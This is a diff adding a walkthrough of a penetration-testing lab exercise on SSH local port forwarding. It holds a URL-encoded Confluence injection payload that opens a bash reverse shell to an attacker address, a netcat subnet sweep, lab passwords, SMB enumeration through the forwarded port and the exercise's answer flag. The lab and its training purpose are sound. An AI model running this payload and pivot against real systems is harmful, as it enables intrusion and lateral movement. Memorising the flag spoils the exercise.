@@ -1,0 +1,69 @@
+# SSH local port forwarding1 adds a small twist to this. With SSH local port forwarding, packets are not forwarded by the same host that listens for packets. Instead, an SSH connection is made between two hosts (an SSH client and an SSH server), a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server. The packets are then forwarded by the SSH server to the socket we specify.
+
+Questions 1
+Start VM Group 1 and follow the steps in this exercise. What's the flag in Provisioning.ps1?
+
+# Use msfconsole listen to port 4444
+curl -v http://192.168.155.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Upgrade the shell have TTY functionality
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+ssh database_admin@10.4.155.215
+password: sqlpass123
+
+ip addr
+ens192: inet 10.4.155.215/24 brd 10.4.155.255
+ens224: inet 172.16.155.254/24 brd 172.16.155.255
+
+ip route
+default via 10.4.155.254 dev ens192 proto static 
+10.4.155.0/24 dev ens192 proto kernel scope link src 10.4.155.215 
+172.16.155.0/24 dev ens224 proto kernel scope link src 172.16.155.254
+
+# We find that PGDATABASE01 is attached to another subnet, this time in the 172.16.50.0/24 range. We don't find a port scanner installed on PGDATABASE01; however, we can still do some initial reconnaissance with the tools that are available.
+# Let's write a Bash for loop to sweep for hosts with an open port 445 on the /24 subnet. We can use Netcat to make the connections, passing the -z flag to check for a listening port without sending data, -v for verbosity, and -w set to 1 to ensure a lower time-out threshold.
+for i in $(seq 1 254); do nc -zv -w 1 172.16.155.$i 445; done
+...
+Connection to 172.16.155.217 445 port [tcp/microsoft-ds] succeeded!
+...
+# Most of the connections time out, suggesting that there's nothing there. In contrast, we'll notice that PGDATABASE01 (at 172.16.155.215) actively refused the connection. We also find that there is a host on the subnet, which has TCP port 445 open: 172.16.155.217!
+
+# We want to be able to enumerate the SMB service on this host. One way is to use whatever built-in tools we find on PGDATABASE01. However, if we did find anything, we would have to download it to PGDATABASE01, then transfer it back to CONFLUENCE01, then back to our Kali machine. This would create quite a tedious manual data transfer process.
+
+# The alternative is to use SSH local port forwarding. We could create an SSH connection from CONFLUENCE01 to PGDATABASE01. As part of that connection, we could create an SSH local port forward. This would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share we found. We could then connect to the listening port on CONFLUENCE01 directly from our Kali machine.
+
+# For now, we should kill our existing SSH connection to PGDATABASE01. We will then set up a new connection with new arguments to establish the SSH local port forward.
+CTRL + c
+
+# In this case, we will instruct SSH to listen on all interfaces on port 4455 on CONFLUENCE01 (0.0.0.0:4455), then forward all packets (through the SSH tunnel to PGDATABASE01) to port 445 on the newly-found host (172.16.50.217:445).
+
+confluence@confluence01:/home/web_admin$ ssh -N -L 0.0.0.0:4455:172.16.155.217:445 database_admin@10.4.155.215
+password: sqlpass123
+
+# Once we've entered the password, we don't receive any output. When running SSH with the -N flag, this is normal. The -N flag prevents SSH from executing any remote commands, meaning we will only receive output related to our port forward.
+
+# But it most likely had hosted the service port up and in the listening state. You may establish another reverse shell session to check
+ss -tulpn
+
+# Now lets use our kali to exploit into HRSHARES smb failed
+smbclient -p 4455 -L //192.168.155.63/ -U hr_admin --password=Welcome1234
+...
+Scripts         Disk      
+Users           Disk 
+...
+
+# We will start from Scripts folder first
+smbclient -p 4455 //192.168.155.63/Scripts -U hr_admin --password=Welcome1234
+smb: \> ls 
+...
+Provisioning.ps1                   AR     1806  Sat May  4 09:31:00 2024
+...
+smb: \> get Provisioning.ps1  
+
+# On the Kali OS
+cat Provisioning.ps1 
+...
+$Flag="OS{6a8f4dddef41675e428e821385ba75ce}";
+...
+
